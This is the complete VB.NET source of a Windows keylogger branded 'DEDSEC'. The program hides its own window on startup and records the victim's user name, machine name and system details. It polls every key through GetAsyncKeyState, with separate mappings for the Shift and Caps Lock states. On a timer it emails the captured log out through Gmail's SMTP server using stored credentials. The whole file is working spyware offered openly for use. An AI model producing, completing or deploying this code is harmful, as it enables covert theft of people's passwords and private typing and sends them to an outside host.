Option Strict On

Imports System.Net.Mail

Public Class Form1
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Integer
    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Integer) As Integer
    Dim result As Integer
    Dim mails As String = My.Settings.mail
    Dim pass As String = My.Settings.mailpass

    Private Sub tmrEmail_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Try
            Dim smtpserver As New SmtpClient
            smtpserver.EnableSsl = True
            Dim mail As New MailMessage
            smtpserver.Credentials = New Net.NetworkCredential(mails, pass)
            smtpserver.Port = 587
            smtpserver.Host = "smtp.gmail.com"
            mail = New MailMessage
            mail.From = New MailAddress(mails)
            mail.To.Add(mails)
            mail.Subject = ("DEDSEC|Key Logger-Logs")
            mail.Body = TextBox1.Text
            smtpserver.Send(mail)
        Catch ex As Exception
            Me.Close()
        End Try
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Timer1.Start()
        Timer2.Start()

        Me.Hide()
        TextBox1.Text = "User Name:     " + Environment.UserName.ToString
        TextBox1.Text = TextBox1.Text + vbNewLine + "Computer Name:     " + Environment.MachineName.ToString
        TextBox1.Text = TextBox1.Text + vbNewLine + "Screen:     " + My.Computer.Screen.WorkingArea.ToString
        TextBox1.Text = TextBox1.Text + vbNewLine + "OS Version:     " + Environment.OSVersion.ToString
        TextBox1.Text = TextBox1.Text + vbNewLine + "Total Physical Memory:     " + My.Computer.Info.TotalPhysicalMemory.ToString
        TextBox1.Text = TextBox1.Text + vbNewLine + "Remain Physical Memory:     " + My.Computer.Info.AvailablePhysicalMemory.ToString
    End Sub
    Public Function GetCapslock() As Boolean
        ' Return Or Set the Capslock toggle.

        GetCapslock = CBool(GetKeyState(&H14) And 1)

    End Function

    Public Function GetShift() As Boolean

        ' Return Or Set the Capslock toggle.

        GetShift = CBool(GetAsyncKeyState(&H10))

    End Function
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        For i As Integer = 1 To 225
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                If GetCapslock() = True And GetShift() = True Then
                    Select Case (i)
                        Case 192
                            TextBox1.Text = TextBox1.Text + "~"
                        Case 1
                            'TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"
                        Case 64 To 90
                            TextBox1.Text = TextBox1.Text + Chr(i).ToString.ToLower
                        Case 97 To 122
                            TextBox1.Text = TextBox1.Text + Chr(i).ToString.ToLower
                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48
                            TextBox1.Text = TextBox1.Text + ")"
                        Case 49
                            TextBox1.Text = TextBox1.Text + "!"
                        Case 50
                            TextBox1.Text = TextBox1.Text + "@"
                        Case 51
                            TextBox1.Text = TextBox1.Text + "#"
                        Case 52
                            TextBox1.Text = TextBox1.Text + "$"
                        Case 53
                            TextBox1.Text = TextBox1.Text + "%"
                        Case 54
                            TextBox1.Text = TextBox1.Text + "^"
                        Case 55
                            TextBox1.Text = TextBox1.Text + "&"
                        Case 56
                            TextBox1.Text = TextBox1.Text + "*"
                        Case 57
                            TextBox1.Text = TextBox1.Text + "("
                        Case 8
                            TextBox1.Text = TextBox1.Text + "[BackSpace]"
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + ">"
                        Case 16
                        Case 160 To 165
                        Case 17
                            TextBox1.Text = TextBox1.Text + "[Ctrl]"
                        Case 18
                            TextBox1.Text = TextBox1.Text + "[Alt]"
                        Case 189
                            TextBox1.Text = TextBox1.Text + "_"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "+"
                        Case 219
                            TextBox1.Text = TextBox1.Text + "{"
                        Case 221
                            TextBox1.Text = TextBox1.Text + "}"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ":"
                        Case 222
                            TextBox1.Text = TextBox1.Text + """"
                        Case 188
                            TextBox1.Text = TextBox1.Text + "<"
                        Case 191
                            TextBox1.Text = TextBox1.Text + "?"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "|"
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter]" + vbNewLine
                        Case 20
                        Case 91 'windows key
                        Case 9
                            TextBox1.Text = TextBox1.Text + " [Tab]"
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [RightMouseClick]"
                        Case 37 To 40
                        Case Else
                            TextBox1.Text = TextBox1.Text + " Ascii(" + i.ToString + ") "
                    End Select
                End If
                If GetCapslock() = True And GetShift() = False Then
                    Select Case (i)
                        Case 91 'windows key
                        Case 1
                            'TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"
                        Case 64 To 90
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 97 To 122
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48 To 57
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 8
                            TextBox1.Text = TextBox1.Text + "[BackSpace]"
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + "."
                        Case 16
                        Case 160 To 165
                        Case 20
                        Case 192
                            TextBox1.Text = TextBox1.Text + "`"
                        Case 189
                            TextBox1.Text = TextBox1.Text + "-"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "="

                        Case 219
                            TextBox1.Text = TextBox1.Text + "["
                        Case 221
                            TextBox1.Text = TextBox1.Text + "]"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ";"
                        Case 222
                            TextBox1.Text = TextBox1.Text + "'"
                        Case 188
                            TextBox1.Text = TextBox1.Text + ","
                        Case 191
                            TextBox1.Text = TextBox1.Text + "/"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "\"
                        Case 17
                            TextBox1.Text = TextBox1.Text + "[Ctrl]"
                        Case 18
                            TextBox1.Text = TextBox1.Text + "[Alt]"
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter]" + vbNewLine
                        Case 9
                            TextBox1.Text = TextBox1.Text + " [Tab]"
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [RightMouseClick]"
                        Case 37 To 40
                        Case Else
                            TextBox1.Text = TextBox1.Text + " Ascii(" + i.ToString + ") "
                    End Select
                End If
                If GetCapslock() = False And GetShift() = True Then
                    Select Case (i)
                        Case 91 'windows key
                        Case 192
                            TextBox1.Text = TextBox1.Text + "~"
                        Case 1
                            ' TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"
                        Case 64 To 90
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 97 To 122
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48
                            TextBox1.Text = TextBox1.Text + ")"
                        Case 49
                            TextBox1.Text = TextBox1.Text + "!"
                        Case 50
                            TextBox1.Text = TextBox1.Text + "@"
                        Case 51
                            TextBox1.Text = TextBox1.Text + "#"
                        Case 52
                            TextBox1.Text = TextBox1.Text + "$"
                        Case 53
                            TextBox1.Text = TextBox1.Text + "%"
                        Case 54
                            TextBox1.Text = TextBox1.Text + "^"
                        Case 55
                            TextBox1.Text = TextBox1.Text + "&"
                        Case 56
                            TextBox1.Text = TextBox1.Text + "*"
                        Case 57
                            TextBox1.Text = TextBox1.Text + "("
                        Case 8
                            TextBox1.Text = TextBox1.Text + "[BackSpace]"
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + ">"
                        Case 16
                        Case 160 To 165
                        Case 17
                            TextBox1.Text = TextBox1.Text + "[Ctrl]"
                        Case 18
                            TextBox1.Text = TextBox1.Text + "[Alt]"
                        Case 189
                            TextBox1.Text = TextBox1.Text + "_"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "+"
                        Case 219
                            TextBox1.Text = TextBox1.Text + "{"
                        Case 221
                            TextBox1.Text = TextBox1.Text + "}"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ":"
                        Case 222
                            TextBox1.Text = TextBox1.Text + """"
                        Case 188
                            TextBox1.Text = TextBox1.Text + "<"
                        Case 191
                            TextBox1.Text = TextBox1.Text + "?"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "|"
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter]" + vbNewLine
                        Case 9
                            TextBox1.Text = TextBox1.Text + " [Tab]"
                        Case 20
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [RightMouseClick]"
                        Case 37 To 40
                        Case Else
                            TextBox1.Text = TextBox1.Text + " Ascii(" + i.ToString + ") "
                    End Select
                End If
                If GetCapslock() = False And GetShift() = False Then
                    Select Case (i)
                        Case 1
                            ' TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"
                        Case 64 To 90
                            TextBox1.Text = TextBox1.Text + Chr(i).ToString.ToLower
                        Case 97 To 122
                            TextBox1.Text = TextBox1.Text + Chr(i).ToString.ToLower
                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48 To 57
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 8
                            TextBox1.Text = TextBox1.Text + "[BackSpace]"
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + "."
                        Case 16
                        Case 160 To 165
                        Case 20
                        Case 192
                            TextBox1.Text = TextBox1.Text + "`"
                        Case 189
                            TextBox1.Text = TextBox1.Text + "-"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "="
                        Case 91 'windows key
                        Case 219
                            TextBox1.Text = TextBox1.Text + "["
                        Case 221
                            TextBox1.Text = TextBox1.Text + "]"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ";"
                        Case 222
                            TextBox1.Text = TextBox1.Text + "'"
                        Case 188
                            TextBox1.Text = TextBox1.Text + ","
                        Case 191
                            TextBox1.Text = TextBox1.Text + "/"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "\"
                        Case 17
                            TextBox1.Text = TextBox1.Text + "[Ctrl]"
                        Case 18
                            TextBox1.Text = TextBox1.Text + "[Alt]"
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter]" + vbNewLine
                        Case 9
                            TextBox1.Text = TextBox1.Text + " [Tab]"
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [RightMouseClick]"
                        Case 37 To 40

                        Case Else
                            TextBox1.Text = TextBox1.Text + " Ascii(" + i.ToString + ") "
                    End Select
                End If

            End If
        Next i
    End Sub

   
End Class
